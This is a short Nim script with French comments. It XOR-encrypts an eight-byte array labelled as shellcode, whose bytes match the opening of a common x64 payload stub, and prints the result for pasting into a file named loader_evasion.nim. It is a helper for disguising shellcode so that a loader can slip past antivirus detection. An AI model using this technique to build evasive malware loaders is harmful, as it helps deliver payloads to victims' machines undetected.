import xor_utils

# Shellcode original
var original: array[8, byte] = [
  byte 0xFC, 0x48, 0x83, 0xE4, 
  0xF0, 0xE8, 0xC0, 0x00
]

# Clé
const key: array[4, byte] = [byte 0xAA, 0xBB, 0xCC, 0xDD]

echo "Shellcode original : ", original.toHexString()

# Chiffrer
xorCrypt(original, key)

echo "Shellcode chiffré  : ", original.toHexString()
echo ""
echo "Copie dans loader_evasion.nim :"
echo "var encryptedShellcode: array[8, byte] = ["
stdout.write "  byte "
for i in 0..<original.len:
  stdout.write "0x" & original[i].toHex()
  if i < original.len - 1:
    stdout.write ", "
echo ""
echo "]"